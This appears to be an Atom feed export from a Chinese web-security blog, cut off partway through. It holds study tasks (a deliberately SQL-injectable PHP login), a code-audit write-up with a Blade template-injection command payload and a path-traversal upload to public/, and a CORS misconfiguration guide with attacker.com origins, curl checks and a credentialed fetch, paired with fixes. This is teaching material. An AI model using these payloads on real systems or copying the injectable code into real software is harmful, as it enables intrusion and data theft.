95e113e80bdc0b429f1a88a35b3fe86f5c9999db24e906cc617ed642cdc5cd8f7656541308c32e59fc84f9b8f3c960d686d072b3a6414e3e316831dd168a50fe949d2254ae7458b80ed5caf3862d01f057a4d5772457bd9539cec8fc3f24eef2662e584909f962c8be7617880a0dedc6a2d76521cdbad19b793fcc11b17894f0eb0b767a8e1ae3ffaf7f4f18e1b77ca105dc7bbd4d2a6e1c6890516d407fd582358c1ce5bf982739edc3d364b2897c42e8a2722d07d8870afb208ed8b18418eee9306d8d7ee0fb2cfd602f1b035efae43e1ff93465dc2a25c961ca40</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>实验课扫描器</title>
    <link href="https://lisien11.xyz/2025/10/07/%E5%AE%9E%E9%AA%8C%E8%AF%BE%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>https://lisien11.xyz/2025/10/07/%E5%AE%9E%E9%AA%8C%E8%AF%BE%E6%89%AB%E6%8F%8F%E5%99%A8/</id>
    <published>2025-10-07T09:17:24.000Z</published>
    <updated>2025-10-07T09:24:43.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础功能参考国内扫描器即可"><a href="#基础功能参考国内扫描器即可" class="headerlink" title="基础功能参考国内扫描器即可"></a>基础功能参考国内扫描器即可</h1><h1 id="重点功能"><a href="#重点功能" class="headerlink" title="重点功能"></a>重点功能</h1><p>1.信息收集<br>写个爬虫爬取qcc，商cc的子公司，然后icp查所有域名<br>子域名查询使用网上较为流行的工具，oneforall，subdoamin这些的。</p><p>2.增加一个添加自定义扫描器的功能<br>只要输入这个扫描器的运行指令，将文件那块用<code>&#123;aaa&#125;</code>这种的当成占位符，然后将输出文件的文件名填写即可添加这个扫描器的功能</p><p>尽量使用正则之类的来适配绝大部分的扫描结果内容。然后得有个输出结果下载功能下载的是这个扫描器正常输出的扫描结果文件，来防止正则匹配不正常。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础功能参考国内扫描器即可&quot;&gt;&lt;a href=&quot;#基础功能参考国内扫描器即可&quot; class=&quot;headerlink&quot; title=&quot;基础功能参考国内扫描器即可&quot;&gt;&lt;/a&gt;基础功能参考国内扫描器即可&lt;/h1&gt;&lt;h1 id=&quot;重点功能&quot;&gt;&lt;a href=&quot;#重点功能&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SRC</title>
    <link href="https://lisien11.xyz/2025/09/29/SRC-1/"/>
    <id>https://lisien11.xyz/2025/09/29/SRC-1/</id>
    <published>2025-09-29T09:35:36.000Z</published>
    <updated>2025-09-29T09:35:36.741Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>协会展示</title>
    <link href="https://lisien11.xyz/2025/09/24/%E5%8D%8F%E4%BC%9A%E5%B1%95%E7%A4%BA/"/>
    <id>https://lisien11.xyz/2025/09/24/%E5%8D%8F%E4%BC%9A%E5%B1%95%E7%A4%BA/</id>
    <published>2025-09-24T09:05:30.000Z</published>
    <updated>2025-09-24T12:45:45.068Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Thinkphp-5-2"><a href="#Thinkphp-5-2" class="headerlink" title="Thinkphp 5.2"></a>Thinkphp 5.2</h1><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Thinkphp-5-2&quot;&gt;&lt;a href=&quot;#Thinkphp-5-2&quot; class=&quot;headerlink&quot; title=&quot;Thinkphp 5.2&quot;&gt;&lt;/a&gt;Thinkphp 5.2&lt;/h1&gt;&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;head</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>web缓存欺骗与投毒</title>
    <link href="https://lisien11.xyz/2025/09/24/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/"/>
    <id>https://lisien11.xyz/2025/09/24/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</id>
    <published>2025-09-24T01:02:11.000Z</published>
    <updated>2025-09-25T07:24:43.790Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f7b05d51cb533bdaabd0d11c1072e5ed499170eb58cb6cffc6796729ae19aa41"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>web任务</title>
    <link href="https://lisien11.xyz/2025/09/22/web%E4%BB%BB%E5%8A%A1/"/>
    <id>https://lisien11.xyz/2025/09/22/web%E4%BB%BB%E5%8A%A1/</id>
    <published>2025-09-22T11:59:16.000Z</published>
    <updated>2025-09-22T13:02:55.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="任务一：HTTP-是一切-Web-攻防的基础，学会抓包与读报文。"><a href="#任务一：HTTP-是一切-Web-攻防的基础，学会抓包与读报文。" class="headerlink" title="任务一：HTTP 是一切 Web 攻防的基础，学会抓包与读报文。"></a>任务一：HTTP 是一切 Web 攻防的基础，学会抓包与读报文。</h1><p>目标：了解基础的几种请求方式、请求/响应头、状态码（200/301/302/404/500）与简单抓包。</p><p>在自己的电脑上安装burp,尝试抓包分析网站流量包的各种意思</p><p>至少需要掌握到能看懂下面的报文<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /api/graphs/fulltext-search?haha=123 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cookie: xxx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;140&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;, &quot;Microsoft Edge&quot;;v=&quot;140&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: text/html</span><br><span class="line">Referer: https://osgraph.com/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">indexName=github&amp;keyword=1</span><br></pre></td></tr></table></figure></p><h1 id="任务二：语言基础"><a href="#任务二：语言基础" class="headerlink" title="任务二：语言基础"></a>任务二：语言基础</h1><h2 id="一个简单的web后端语言-php"><a href="#一个简单的web后端语言-php" class="headerlink" title="一个简单的web后端语言:php"></a>一个简单的web后端语言:php</h2><p>自己在上网去学习，个人推荐<a href="https://www.runoob.com/php/php-tutorial.html">菜鸟教程</a></p><p>并不用学习的特别深入能看懂如下代码即可，之后的学习可以在,ctf刷题时通过代码审计不断的学习<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// login.php</span></span><br><span class="line"><span class="comment">// 纯 PHP 登录示例，使用单独文件的数据库连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入数据库连接</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟接收表单数据（CLI 或 Web POST）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() === <span class="string">&#x27;cli&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请输入用户名: &quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请输入密码: &quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查输入</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;用户名和密码不能为空\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询数据库（明文密码示例）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录成功！欢迎你，<span class="subst">$username</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>db.php如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE test;</span><br><span class="line"></span><br><span class="line">USE test;</span><br><span class="line"></span><br><span class="line">CREATE TABLE <span class="title function_ invoke__">users</span> (</span><br><span class="line">  id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">  username <span class="title function_ invoke__">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">  password <span class="title function_ invoke__">VARCHAR</span>(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">INSERT INTO <span class="title function_ invoke__">users</span> (username, password) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;12345&#x27;</span>);</span><br><span class="line">INSERT INTO <span class="title function_ invoke__">users</span> (username, password) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;abcde&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><p>简单的了解各种表单，如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- login.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- upload.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>上传文件<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="任务三：迎接第一个漏洞，sql注入"><a href="#任务三：迎接第一个漏洞，sql注入" class="headerlink" title="任务三：迎接第一个漏洞，sql注入"></a>任务三：迎接第一个漏洞，sql注入</h1><p>自己搭建一个名为建sqli-labs，可以参照网上的教程去学习sql注入的各种姿势（在找教程时要找一个好的，个人建议找有对php源码漏洞成因进行分析的，而不是找那些为刷而刷的wp）</p><p>靶场下载地址<br><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>搭建的过程也是一种学习，可以明白一个php项目是如何在自己的机子上被搭起来的</p><p>任务要求至少完成Less-1（union注入），Less-5（报错注入）Less-11（POST型union）。<br><strong>注意：在打这些关卡时我们应该学习这个漏洞的原理，危害，如何修复。最重要的是需要理解原理所以在刷时需要配合源码进行学习</strong></p><p><strong>PS（有能力的建议在学习一些盲注写一下Less-7）</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;任务一：HTTP-是一切-Web-攻防的基础，学会抓包与读报文。&quot;&gt;&lt;a href=&quot;#任务一：HTTP-是一切-Web-攻防的基础，学会抓包与读报文。&quot; class=&quot;headerlink&quot; title=&quot;任务一：HTTP 是一切 Web 攻防的基础，学会抓包与</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>代码审计</title>
    <link href="https://lisien11.xyz/2025/09/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://lisien11.xyz/2025/09/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-09-17T06:28:02.000Z</published>
    <updated>2025-09-17T08:39:37.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="第1得分点"><a href="#第1得分点" class="headerlink" title="第1得分点"></a>第1得分点</h2>  <p>搜索Unauthorized找到EnsureTokenIsValid.php<br><img src="image-32.png" alt="alt text"><br>X-Token对上就可以了<br>请求头X-Token输入为my-secret-token<br>  </p><h2 id="第二得分点"><a href="#第二得分点" class="headerlink" title="第二得分点"></a>第二得分点</h2>  <p>访问token路由会返回token值。</p>    <p>将token和cookie都替换一下就可以成功访问了<br>Levaler的token默认是X-CSRF-TOKEN头<br><br>看代码可以发现上传的name为avatar，上传后会保存到/var/www/laravel-project/storage/app/文件名<br>这里我们是无法执行的，但是move存在目录穿越我们可以传to为../../public/aaa.php从而穿越到public</p>  <p>文件上传然后move存在目录穿越穿越到public下</p>      <h2 id="第三得分点"><a href="#第三得分点" class="headerlink" title="第三得分点"></a>第三得分点</h2>  <p>大多数回显的点都直接使用Blade::render并没有预处理存在ssti<br>直接在demo的name下插入ssti语句即可命令执行<br>@php system(‘whoami’); @endphp<br>  </p><p>每个语言挑选中级或高级其中一个做，做两个按高级算分。</p><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="第五得分点"><a href="#第五得分点" class="headerlink" title="第五得分点"></a>第五得分点</h2><img src="/2025/09/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/IMG_20250917-163852193.png" class="">  <p>配置文件中找到shirokey</p><p>shiro反序列化网上早已有payload利用网上的工具<br><img src="/2025/09/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/IMG_20250917-163937606.png" class="">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php&quot;&gt;&lt;a href=&quot;#php&quot; class=&quot;headerlink&quot; title=&quot;php&quot;&gt;&lt;/a&gt;php&lt;/h1&gt;&lt;h2 id=&quot;第1得分点&quot;&gt;&lt;a href=&quot;#第1得分点&quot; class=&quot;headerlink&quot; title=&quot;第1得分点&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SRC</title>
    <link href="https://lisien11.xyz/2025/09/14/SRC/"/>
    <id>https://lisien11.xyz/2025/09/14/SRC/</id>
    <published>2025-09-14T08:20:36.000Z</published>
    <updated>2025-09-14T08:29:15.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h1><p>所谓cors其实就是浏览器的跨站请求协议<br>cors和csrf的区别就是一个是利用img等标签来操控用户行为看不到其返回的值，一个是通过跨站请求来获取敏感信息。</p><p>主要原因是在某些网站是需要允许跨站资源访问的，这时候就一套允许携带cookie的跨站协议。<br>而cors由几个请求头来进行操控<br>Access-Control-Allow-Origin: <em><br>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS<br>Access-Control-Allow-Headers: </em><br>Origin就是其允许的域如果这个返回值可控或者这个返回值为*即可跨域来获取用户的某些信息<br>主要是fetch这里ajAX请求</p><p>下面这个文章写挺好的<br><a href="https://forum.butian.net/share/2901">https://forum.butian.net/share/2901</a></p><h1 id="危险组合一：最严重-—-任意-Origin-回显-允许带凭证"><a href="#危险组合一：最严重-—-任意-Origin-回显-允许带凭证" class="headerlink" title="危险组合一：最严重 — 任意 Origin 回显 + 允许带凭证"></a>危险组合一：<strong>最严重 — 任意 Origin 回显 + 允许带凭证</strong></h1><p>请求（由攻击者发送）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br></pre></td></tr></table></figure><p>服务器响应（危险）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com    // 或直接回显请求的 Origin</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Set-Cookie: session=...; HttpOnly; Secure</span><br><span class="line">Vary: Origin (缺失则更危险)</span><br></pre></td></tr></table></figure><p>危险性：攻击者页面可以 <code>fetch(..., &#123; credentials: &#39;include&#39; &#125;)</code>，浏览器既会把目标站点 cookie 发出，又会把响应 body 交给攻击者脚本，<strong>完全泄露登录用户的私有数据</strong>。<br>检测（curl 看头）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Origin: https://attacker.com&quot;</span> https://target.example/api/secret</span><br></pre></td></tr></table></figure><p>浏览器验证（真实可利用）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://target.example/api/secret&#x27;</span>, &#123; <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span> &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(t))</span><br></pre></td></tr></table></figure><p>修复：不要回显任意 Origin；如果必须允许凭证，<strong>只返回白名单中的具体域名</strong>，并添加 <code>Vary: Origin</code>。</p><hr><h1 id="危险组合二：Allow-Origin-与敏感响应-误配凭证"><a href="#危险组合二：Allow-Origin-与敏感响应-误配凭证" class="headerlink" title="危险组合二：Allow-Origin: * 与敏感响应 / 误配凭证"></a>危险组合二：<strong>Allow-Origin: * 与敏感响应 / 误配凭证</strong></h1><p>请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br></pre></td></tr></table></figure><p>响应（松散/错误）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: *</span><br><span class="line">Access-Control-Allow-Credentials: true    // 有些错误实现会返回这个（或老旧/代理问题）</span><br></pre></td></tr></table></figure><p>危险性：按规范 <code>*</code> 不应与 <code>Allow-Credentials: true</code> 同时使用；现代浏览器会忽略 <code>*</code>+credentials 组合，但错误的代理/旧浏览器/自制客户端或缓存不当可能造成泄露。即便没有凭证，公开敏感接口也可能被任意站点读取。<br>检测（curl）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H <span class="string">&quot;Origin: https://attacker.com&quot;</span> https://target.example/api/secret</span><br></pre></td></tr></table></figure><p>修复：不要用 <code>*</code> 对敏感数据开放；若需要公开 API，确保其仅返回公共数据且不依赖 cookie；敏感接口需白名单 + credentials 控制。</p><hr><h1 id="危险组合三：回显-Origin-允许宽松-Methods-Headers（扩大发现面）"><a href="#危险组合三：回显-Origin-允许宽松-Methods-Headers（扩大发现面）" class="headerlink" title="危险组合三：回显 Origin + 允许宽松 Methods/Headers（扩大发现面）"></a>危险组合三：<strong>回显 Origin + 允许宽松 Methods/Headers（扩大发现面）</strong></h1><p>请求（触发预检）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://attacker.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-Requested-With, Authorization, Content-Type</span><br></pre></td></tr></table></figure><p>响应（危险）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true   // 或存在</span><br><span class="line">Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH   // 过宽</span><br><span class="line">Access-Control-Allow-Headers: Authorization, X-Requested-With, Content-Type, *</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure><p>危险性：若服务允许任意方法和任意头并允许凭证，攻击者可使用复杂请求（带 <code>Authorization</code> 或自定义头）并长期复用（Max-Age）。<br>检测（curl 预检）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X OPTIONS \</span><br><span class="line">  -H <span class="string">&quot;Origin: https://attacker.com&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Access-Control-Request-Method: POST&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Access-Control-Request-Headers: Authorization&quot;</span> \</span><br><span class="line">  https://target.example/api/secret</span><br></pre></td></tr></table></figure><p>修复：限制允许的方法与头到业务最小集合；不要用 <code>*</code>；缩短 <code>Max-Age</code>。</p><hr><h1 id="危险组合四：Expose-Headers-过度暴露敏感头"><a href="#危险组合四：Expose-Headers-过度暴露敏感头" class="headerlink" title="危险组合四：Expose-Headers 过度暴露敏感头"></a>危险组合四：<strong>Expose-Headers 过度暴露敏感头</strong></h1><p>响应（危险）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: https://attacker.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Expose-Headers: Set-Cookie, Authorization, 